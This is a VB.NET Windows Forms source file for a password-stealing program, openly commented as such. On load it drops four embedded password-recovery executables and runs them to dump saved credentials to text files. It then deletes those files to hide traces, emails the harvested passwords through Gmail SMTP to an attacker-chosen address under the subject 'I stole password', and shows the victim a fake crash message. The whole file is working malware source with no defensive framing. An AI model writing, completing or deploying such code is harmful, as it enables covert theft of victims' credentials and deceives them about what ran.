Imports System.Net.Mail

Public Class Form1

    Dim server As String = "smtp.gmail.com" 'you can change the gmail.com to something else also
    Dim username As String = "input the mail you are going to use here"
    Dim password As String = "input the password of the mail"
    Dim port = 587 'this port is used by many email websites
    Private Sub form1_load(sender As Object, e As EventArgs) Handles MyBase.Load
        On Error Resume Next 'means if the program runs into an error it still continues

        Dim home As String = My.Computer.FileSystem.SpecialDirectories.MyMusic & "\home\" 'declares "home" to the mymusic directory (here will the files extract
        If My.Computer.FileSystem.DirectoryExists(home) Then
            My.Computer.FileSystem.DeleteDirectory(home, FileIO.DeleteDirectoryOption.DeleteAllContents) 'checks the directory if it's there then it will delete it
        End If

        MkDir(home) 'it recreates the directory

        IO.File.WriteAllBytes(home & "1.exe", My.Resources._1) 'exports the recovery program from the resources into the directory
        IO.File.WriteAllBytes(home & "2.exe", My.Resources._2)
        IO.File.WriteAllBytes(home & "3.exe", My.Resources._3)
        IO.File.WriteAllBytes(home & "4.exe", My.Resources._4)

        Process.Start(home & "1.exe", "/stext 1.txt") 'exports the passwords to the text file
        Process.Start(home & "2.exe", "/stext 2.txt")
        Process.Start(home & "3.exe", "/stext 3.txt")
        Process.Start(home & "4.exe", "/stext 4.txt")

        Threading.Thread.Sleep(200)

        Dim a As String = IO.File.ReadAllText(Application.StartupPath & "/1.txt")
        Dim b As String = IO.File.ReadAllText(Application.StartupPath & "/2.txt")
        Dim c As String = IO.File.ReadAllText(Application.StartupPath & "/3.txt")
        Dim d As String = IO.File.ReadAllText(Application.StartupPath & "/4.txt")

        Dim final As String = a & vbNewLine & "-----NEXT-----" & vbNewLine & b & "-----NEXT-----" & vbNewLine & c & "-----NEXT-----" & vbNewLine & d
        'Organises the file

        Kill(Application.StartupPath & "/1.txt") 'Deletes traces of any application
        Kill(Application.StartupPath & "/2.txt")
        Kill(Application.StartupPath & "/3.txt")
        Kill(Application.StartupPath & "/4.txt")

        Dim smtpserver As New SmtpClient()
        Dim mail As New MailMessage()
        smtpserver.Credentials = New Net.NetworkCredential(username, password) 'declared these up
        smtpserver.Port = port
        smtpserver.Host = "smtp.gmail.com"
        smtpserver.EnableSsl = True
        mail = New MailMessage()
        mail.From = New MailAddress(username)
        mail.To.Add("input the email here u want to send the passwords to.") '<------ Here
        mail.Subject = "I stole password @ " & My.Computer.Clock.LocalTime 'The email subject will be "i stole password @ time)
        mail.Body = final
        smtpserver.Send(mail) ' Sends mail
        MsgBox("Critical Error Runtime at 0x009xb (thread_start) Dll Not Responding To Hook", MsgBoxStyle.Critical, "Dll not responding") 'Shows a fake error to the victim
        Me.Close() 'Closes itself
    End Sub

End Class
